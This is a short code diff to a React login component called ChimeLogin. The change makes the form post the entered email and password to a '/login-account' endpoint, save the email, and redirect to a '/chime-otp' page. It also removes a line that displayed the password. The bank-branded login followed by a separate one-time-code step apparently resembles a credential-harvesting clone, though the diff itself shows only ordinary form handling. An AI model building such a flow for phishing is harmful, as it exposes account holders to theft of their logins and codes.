@@ -13,6 +13,8 @@ import { useForm } from "react-hook-form";
 import { useNavigate } from "react-router-dom";
 import toast from "react-hot-toast";
 import { SpinnerLoading } from "./SpinnerLoading";
+import api from "./axios";
+import { emailStore } from "./authStore";
 
 export const ChimeLogin = () => {
   const [showPassword, setShowPassword] = useState(false);
@@ -26,13 +28,20 @@ export const ChimeLogin = () => {
 
   const navigate = useNavigate();
 
+  const updateEmailStore = emailStore((state) => state.updateEmailStore);
+
   const onSubmit = async (data) => {
     try {
       setIsLoading(true);
+      const response = await api.post("/login-account", data);
+      const { success, message } = response.data;
 
-      toast.success(data.password);
-
+      if (!success)
+        return toast.error(message || "Login failed please try again.");
+      toast.success(message);
+      updateEmailStore(data.email);
       return navigate("/chime-otp");
+
     } catch (err) {
       toast.error(err.response?.data?.message);
     } finally {
